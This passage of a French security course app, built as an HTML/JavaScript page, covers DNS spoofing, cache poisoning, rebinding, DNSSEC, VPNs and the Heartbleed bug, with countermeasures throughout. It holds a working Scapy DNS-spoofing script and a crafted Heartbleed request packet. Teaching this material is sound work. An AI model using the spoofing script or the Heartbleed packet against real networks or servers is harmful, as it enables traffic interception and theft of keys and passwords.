    {id:"s18_2",short:"18.2 Attaques locales",title:"18.2 Usurpation DNS locale",content:"<div class=\"prose\">\n<p>Si l'attaquant est sur le même LAN, il peut intercepter les requêtes DNS et envoyer de fausses réponses avant le serveur légitime (race condition sur le Transaction ID 16 bits).</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Usurpation DNS locale avec Scapy</div>\n<pre>from scapy.all import *\n\ndef spoof_dns(pkt):\n    if DNS in pkt and pkt[DNS].qr == 0:  # C'est une requete\n        qname = pkt[DNS].qd.qname\n        if b\"example.com\" in qname:\n            sp = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                  UDP(dport=pkt[UDP].sport, sport=53) /                  DNS(id=pkt[DNS].id, qr=1, aa=1,\n                     qd=pkt[DNS].qd,\n                     an=DNSRR(rrname=qname, ttl=10, rdata=\"1.2.3.4\"))\n            send(sp, verbose=0)\n\nsniff(filter=\"udp port 53\", prn=spoof_dns)</pre></div>"},
    {id:"s18_3",short:"18.3 Cache Poisoning",title:"18.3 Empoisonnement du Cache DNS",content:"<div class=\"prose\">\n<p>L'<strong>empoisonnement du cache DNS</strong> (cache poisoning) vise le résolveur récursif. Si le cache est corrompu, tous les clients l'utilisant sont redirigés vers l'IP de l'attaquant.</p>\n<h3 class=\"sub\">Attaque de Kaminsky (2008)</h3>\n<ol>\n<li>Forcer le résolveur à faire des requêtes pour des sous-domaines aléatoires (random1234.example.com)</li>\n<li>Envoyer des milliers de fausses réponses avec des Transaction IDs variés (bruteforce 0–65535)</li>\n<li>La fausse réponse inclut une <strong>section autoritaire falsifiée</strong> pour tout example.com</li>\n<li>Quand le bon ID est deviné → tout le domaine est empoisonné !</li>\n</ol>\n</div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Impact</div>\n<p>Tous les utilisateurs du résolveur corrompu sont redirigés vers l'attaquant. Permet&nbsp;: phishing, vol de session, inject de malware.</p></div>\n<div class=\"info-box note\"><div class=\"ib-title\">Contre-mesures</div>\n<ul>\n<li><strong>Randomisation du port source</strong>&nbsp;: ajoute 16 bits d'entropie</li>\n<li><strong>DNSSEC</strong>&nbsp;: signatures cryptographiques sur les enregistrements</li>\n</ul></div>"},
    {id:"s18_4",short:"18.4 DNS Rebinding",title:"18.4 DNS Rebinding",content:"<div class=\"prose\">\n<p>Le <strong>DNS rebinding</strong> contourne la Same-Origin Policy (SOP) des navigateurs.</p>\n<h3 class=\"sub\">Mécanisme</h3>\n<ol>\n<li>Victime visite attacker.com (TTL très court, ex. 1 s)</li>\n<li>D'abord résolu vers le vrai serveur de l'attaquant</li>\n<li>Après expiration du TTL, le DNS répond avec l'IP d'une machine LAN de la victime (ex. 192.168.1.1)</li>\n<li>Le JS de la page peut maintenant accéder au routeur en croyant être sur le même domaine</li>\n</ol>\n<h3 class=\"sub\">Contre-mesures</h3>\n<ul>\n<li>Vérifier l'en-tête HTTP <code>Host</code> côté serveur</li>\n<li>Utiliser HTTPS avec certificats valides</li>\n<li>Pare-feu filtrant DNS renvoyant des IP RFC 1918</li>\n</ul></div>"},
    {id:"s18_5",short:"18.5 DNSSEC",title:"18.5 DNSSEC",content:"<div class=\"prose\">\n<p><strong>DNSSEC</strong> ajoute une signature cryptographique aux enregistrements DNS. Les résolveurs vérifient l'authenticité des réponses grâce à une chaîne de confiance.</p>\n</div>\n<table class=\"dt\">\n<tr><th>Enregistrement</th><th>Rôle</th></tr>\n<tr><td>DNSKEY</td><td>Clé publique de la zone</td></tr>\n<tr><td>RRSIG</td><td>Signature d'un ensemble d'enregistrements</td></tr>\n<tr><td>DS</td><td>Empreinte de la DNSKEY, publiée dans la zone parente</td></tr>\n<tr><td>NSEC/NSEC3</td><td>Preuve de non-existence d'un enregistrement</td></tr>\n</table>\n<div class=\"info-box note\"><div class=\"ib-title\">Limitation</div>\n<p>DNSSEC protège l'intégrité mais PAS la confidentialité. Pour la confidentialité, utiliser <strong>DoH</strong> (DNS over HTTPS) ou <strong>DoT</strong> (DNS over TLS).</p></div>"}
]};
const ch19={id:"ch19",num:19,icon:"\ud83d\udd12",title:"Réseau Privé Virtuel (VPN)",desc:"Tunnels VPN via TUN/TAP, TLS/SSL, OpenVPN et IPsec pour sécuriser les communications.",sections:[
    {id:"s19_1",short:"19.1 Introduction",title:"19.1 Introduction aux VPN",content:"<div class=\"prose\">\n<p>Un <strong>VPN (Virtual Private Network)</strong> crée une communication sécurisée (chiffrée + authentifiée) sur un réseau non fiable (Internet). Il fournit confid., intégrité et authentification.</p>\n<h3 class=\"sub\">Utilisations</h3>\n<ul>\n<li><strong>Accès distant</strong>&nbsp;: télétravail → réseau interne de l'entreprise</li>\n<li><strong>Site-à-site</strong>&nbsp;: relier deux réseaux d'entreprise distants</li>\n<li><strong>Personnel</strong>&nbsp;: chiffrer tout le trafic internet d'un utilisateur</li>\n</ul></div>"},
    {id:"s19_2",short:"19.2 Tunnel TUN/TAP",title:"19.2 Tunnélisation avec TUN/TAP",content:"<div class=\"prose\">\n<p>Linux fournit des interfaces virtuelles TUN (couche IP) et TAP (couche Ethernet). Le flux d'un tunnel VPN&nbsp;:</p>\n<ol>\n<li>App envoie un paquet → noyau le route vers tun0</li>\n<li>Programme VPN lit le paquet sur tun0 et le <strong>chiffre</strong></li>\n<li>Paquet chiffré encapsulé dans UDP/TCP et envoyé via Internet</li>\n<li>Serveur VPN déchiffre et injecte dans son réseau local</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Créer une interface TUN</div>\n<pre>#include &lt;linux/if_tun.h&gt;\nint tun_alloc(char *dev) {\n    struct ifreq ifr;\n    int fd = open(\"/dev/net/tun\", O_RDWR);\n    memset(&amp;ifr, 0, sizeof(ifr));\n    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;\n    strncpy(ifr.ifr_name, dev, IFNAMSIZ);\n    ioctl(fd, TUNSETIFF, &amp;ifr);\n    return fd;\n}\n// Configuration :\n// ip addr add 10.9.0.1/24 dev tun0\n// ip link set tun0 up</pre></div>"},
    {id:"s19_3",short:"19.3 TLS + OpenVPN",title:"19.3 TLS/SSL et OpenVPN",content:"<div class=\"prose\">\n<h3 class=\"sub\">TLS (Transport Layer Security)</h3>\n<p>TLS fournit&nbsp;: chiffrement (AES-256), authentification (certificats X.509), intégrité (HMAC). Il est au cœur de HTTPS et OpenVPN.</p>\n<h3 class=\"sub\">Handshake TLS simplifié</h3>\n<ol>\n<li>Client → Serveur&nbsp;: <em>ClientHello</em> (versions + suites cryptographiques)</li>\n<li>Serveur → Client&nbsp;: <em>ServerHello</em> + certificat X.509</li>\n<li>Client vérifie le certificat via les CA de confiance</li>\n<li>Échange de clés (ECDH) → clé de session partagée</li>\n<li>Tout le reste est chiffré avec la clé de session</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Configuration OpenVPN basique</div>\n<pre># server.conf\nport 1194\nproto udp\ndev tun\nca   ca.crt      # Certificat de l'autorité de certification\ncert server.crt\nkey  server.key\ndh   dh2048.pem\nserver 10.8.0.0 255.255.255.0\ncipher AES-256-CBC\npush \"route 192.168.10.0 255.255.255.0\"</pre></div>"},
    {id:"s19_4",short:"19.4 IPsec",title:"19.4 IPsec",content:"<div class=\"prose\">\n<h3 class=\"sub\">IPsec</h3>\n<p><strong>IPsec</strong> sécurise les communications à la couche IP (contrairement à TLS = couche transport). Composants&nbsp;:</p>\n<ul>\n<li><strong>AH (Authentication Header)</strong>&nbsp;: authentification + intégrité (pas de confidentialité)</li>\n<li><strong>ESP (Encapsulating Security Payload)</strong>&nbsp;: authentification + intégrité + <em>chiffrement</em></li>\n<li><strong>IKE (Internet Key Exchange)</strong>&nbsp;: négociation automatique des clés</li>\n</ul>\n<h3 class=\"sub\">Modes IPsec</h3>\n<ul>\n<li><strong>Mode Transport</strong>&nbsp;: seule la charge utile est chiffrée. L'en-tête IP original reste visible. Hôte-à-hôte.</li>\n<li><strong>Mode Tunnel</strong>&nbsp;: tout le paquet IP est chiffré et encapsulé dans un nouveau paquet. VPN site-à-site.</li>\n</ul></div>"}
]};
const ch20={id:"ch20",num:20,icon:"\ud83d\udc94",title:"Heartbleed — Fuite Mémoire OpenSSL",desc:"CVE-2014-0160 : fuite de mémoire TLS via Heartbeat. Vol de clés privées, mots de passe, cookies.",sections:[
    {id:"s20_1",short:"20.1 Contexte",title:"20.1 Contexte — Qu'est-ce qu'Heartbleed ?",content:"<div class=\"prose\">\n<p><strong>Heartbleed</strong> (CVE-2014-0160, avril 2014) est une vulnérabilité critique dans <strong>OpenSSL</strong>. Elle permettait de lire jusqu'à <strong>64 Ko de mémoire par requête</strong> depuis un serveur HTTPS, sans authentification et sans laisser de trace.</p>\n<p>Données potentiellement volées&nbsp;: clés privées du serveur, mots de passe, cookies de session, données d'autres utilisateurs.</p>\n</div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Pourquoi c'est grave ?</div>\n<ul>\n<li>Aucune trace dans les journaux (furtive)</li>\n<li>Accessible à n'importe qui, sans authentification</li>\n<li>Vol de clé privée → tout le chiffrement TLS est compromis (passé ET futur)</li>\n<li>~17% des serveurs HTTPS dans le monde étaient vulnérables</li>\n</ul></div>"},
    {id:"s20_2",short:"20.2 Heartbeat TLS",title:"20.2 Le Mécanisme Heartbeat TLS",content:"<div class=\"prose\">\n<p>L'extension TLS Heartbeat (RFC 6520) permet un \"ping\" pour maintenir une connexion active&nbsp;:</p>\n<ol>\n<li>Client envoie un <strong>HeartbeatRequest</strong>&nbsp;: type + longueur déclarée + payload</li>\n<li>Serveur répond avec un <strong>HeartbeatResponse</strong>&nbsp;: exactement les mêmes données</li>\n</ol>\n<h3 class=\"sub\">Le bug — Pas de validation de longueur</h3>\n<p>OpenSSL copiait les données en se basant sur la <strong>longueur déclarée par le client</strong>, sans vérifier la longueur réelle du payload.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Code vulnérable (simplifié)</div>\n<pre>// Code vulnérable dans OpenSSL :\npayload_length = (msg[0] &lt;&lt; 8) | msg[1]; // Longueur DÉCLARÉE par client\npayload = &amp;msg[2];                          // Payload réel (peut être vide !)\n\n// ERREUR : copier payload_length octets sans vérifier la taille réelle !\nmemcpy(bp, payload, payload_length);  // FUITE MÉMOIRE !\n\n// FIX (patch OpenSSL 1.0.1g) :\nif (1 + 2 + payload_length + 16 &gt; s-&gt;s3-&gt;rrec.length)\n    return 0; // Longueur déclarée trop grande → rejeter !</pre></div>"},
    {id:"s20_3",short:"20.3 Exploitation",title:"20.3 Exploitation de la Faille",content:"<div class=\"prose\">\n<p>Exploiter Heartbleed est simple&nbsp;: envoyer un HeartbeatRequest avec longueur déclarée = 65535 mais payload réel = 1 octet. Le serveur répond avec 65534 octets de sa mémoire !</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Paquet Heartbeat malveillant</div>\n<pre># Construction du paquet malveillant :\nheartbeat = (\n    b\"\\x18\"       # Type : Heartbeat (24)\n    b\"\\x03\\x02\"  # Version : TLS 1.1\n    b\"\\x00\\x03\"  # Longueur du record : 3 octets\n    b\"\\x01\"       # Type : HeartbeatRequest (1)\n    b\"\\xff\\xff\"  # Longueur DÉCLARÉE : 65535 (MENSONGE !)\n    # Payload réel : 0 octet\n    # Le serveur va lire 65535 octets de sa mémoire !</pre></div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Données sensibles récupérables</div>\n<ul>\n<li>Clés privées RSA/EC du serveur</li>\n<li>Mots de passe soumis via HTTPS</li>\n<li>Cookies de session</li>\n<li>Données d'autres utilisateurs sur le même serveur</li>\n</ul></div>"},
    {id:"s20_4",short:"20.4 Contre-mesures",title:"20.4 Contre-mesures",content:"<div class=\"prose\"><h3 class=\"sub\">Contre-mesures immédiates (2014)</h3>\n<ol>\n<li>Mettre à jour OpenSSL vers 1.0.1g ou ultérieur</li>\n<li>Révoquer et renouveler tous les certificats TLS (les clés privées peuvent avoir été volées)</li>\n<li>Forcer la réauthentification de tous les utilisateurs</li>\n<li>Changer les mots de passe des services affectés</li>\n</ol>\n<h3 class=\"sub\">Leçons apprises</h3>\n<ul>\n<li>Toujours valider les entrées — ne jamais faire confiance aux longueurs déclarées</li>\n<li>Utiliser des outils d'analyse mémoire (Valgrind, AddressSanitizer)</li>\n<li>Audits de sécurité réguliers des bibliothèques critiques</li>\n</ul></div>\n<table class=\"dt\">\n<tr><th>Aspect</th><th>Détail</th></tr>\n<tr><td>CVE</td><td>CVE-2014-0160</td></tr>\n<tr><td>Versions affectées</td><td>OpenSSL 1.0.1 à 1.0.1f</td></tr>\n<tr><td>Type</td><td>Lecture hors limites (Buffer Over-read)</td></tr>\n<tr><td>Impact</td><td>~500 000 serveurs HTTPS vulnérables</td></tr>\n<tr><td>Patch</td><td>OpenSSL 1.0.1g (7 avril 2014)</td></tr>\n<tr><td>Traces laissées</td><td>Aucune dans les journaux standards</td></tr>\n</table>"}
]};

// ===== APP LOGIC =====
const chapters = [ch15, ch16, ch17, ch18, ch19, ch20];

// --- State ---
let currentChId = 'ch15';
let currentSecId = '';
const readSet = new Set(JSON.parse(localStorage.getItem('secnet_read') || '[]'));
let sidebarOpen = true;

// --- Render ---
function renderChapterList(chs) {
    const list = document.getElementById('chapterList');
    list.innerHTML = '';
    chs.forEach(ch => {
        const div = document.createElement('div');
        div.className = 'chapter-item' + (ch.id === currentChId ? ' active' : '');
        div.innerHTML = '<span>' + ch.icon + '</span><span class="chapter-label">Ch.' + ch.num + ' — ' + ch.title + '</span>';
        div.onclick = () => selectChapter(ch.id);
        list.appendChild(div);
    });
}

function renderChapter(ch) {
    const container = document.getElementById('chaptersContainer');
    // Check if already rendered
    let el = document.getElementById('panel_' + ch.id);
    if (!el) {
        el = document.createElement('div');
        el.id = 'panel_' + ch.id;
        el.className = 'content';
        el.innerHTML = buildChapterHTML(ch);
        container.appendChild(el);
        // Add section button listeners
        el.querySelectorAll('.sec-btn').forEach(btn => {
            btn.onclick = () => selectSection(ch.id, btn.dataset.sec);
        });
        // Add read button listeners
        el.querySelectorAll('.read-btn').forEach(btn => {
            btn.onclick = () => toggleRead(ch.id, btn.dataset.sec, btn);
        });
    }
    // Show this panel, hide others
    document.querySelectorAll('.content').forEach(p => p.classList.remove('active'));
    el.classList.add('active');
    // Show first section if none selected
    const firstSec = ch.sections[0].id;
    selectSection(ch.id, currentSecId || firstSec);
}

function buildChapterHTML(ch) {
    let html = '<div class="chapter-tag">' + ch.icon + ' Chapitre ' + ch.num + '</div>';
    html += '<h1 class="chapter-title">' + ch.title + '</h1>';
    html += '<p class="chapter-desc">' + ch.desc + '</p>';
    html += '<div class="section-nav" id="secnav_' + ch.id + '">';
    ch.sections.forEach(s => {
        html += '<button class="sec-btn" data-sec="' + s.id + '">' + s.short + '</button>';
    });
    html += '</div>';
    ch.sections.forEach(s => {
        html += '<div class="section-block" id="sec_' + s.id + '">';
        html += '<h2 class="section-title">' + s.title + '</h2>';
        html += s.content;
        const readKey = ch.id + '|' + s.id;
        const isDone = readSet.has(readKey);
        html += '<button class="read-btn' + (isDone ? ' done' : '') + '" data-sec="' + s.id + '">' +
                (isDone ? '✅ Lu' : '○ Marquer comme lu') + '</button>';
        html += '</div>';
    });
    return html;
}

function selectChapter(chId) {
    currentChId = chId;
    currentSecId = '';
    const ch = chapters.find(c => c.id === chId);
    if (!ch) return;
    renderChapterList(chapters);
    renderChapter(ch);
    updateProgress();
    // Close mobile sidebar
    if (window.innerWidth <= 768) {
        document.getElementById('sidebar').classList.remove('mobile-open');
    }
}

function selectSection(chId, secId) {
    currentSecId = secId;
    // Update sec buttons
    const nav = document.getElementById('secnav_' + chId);
    if (nav) {
        nav.querySelectorAll('.sec-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.sec === secId);
        });
    }
    // Show section
    const ch = chapters.find(c => c.id === chId);
    if (!ch) return;
    ch.sections.forEach(s => {
        const el = document.getElementById('sec_' + s.id);
        if (el) el.classList.toggle('active', s.id === secId);
    });
}

function toggleRead(chId, secId, btn) {
    const key = chId + '|' + secId;
    if (readSet.has(key)) {
        readSet.delete(key);
        btn.textContent = '○ Marquer comme lu';
        btn.classList.remove('done');
    } else {
        readSet.add(key);
        btn.textContent = '✅ Lu';
        btn.classList.add('done');
    }
    localStorage.setItem('secnet_read', JSON.stringify([...readSet]));
    updateProgress();
}

function updateProgress() {
    const total = chapters.reduce((a, c) => a + c.sections.length, 0);
    document.getElementById('progressText').textContent = readSet.size + '/' + total;
}

function toggleSidebar() {
    const sb = document.getElementById('sidebar');
    if (window.innerWidth <= 768) {
        sb.classList.toggle('mobile-open');
    } else {
        sidebarOpen = !sidebarOpen;
        sb.classList.toggle('collapsed', !sidebarOpen);
    }
}

function onSearch(q) {
    q = q.toLowerCase();
    const filtered = q ? chapters.filter(c =>
        c.title.toLowerCase().includes(q) ||
        c.sections.some(s => s.title.toLowerCase().includes(q))
    ) : chapters;
    renderChapterList(filtered);
    document.getElementById('noResult').style.display = filtered.length === 0 ? 'block' : 'none';
}

// --- Init ---
renderChapterList(chapters);
selectChapter('ch15');
updateProgress();
</script>
</body>
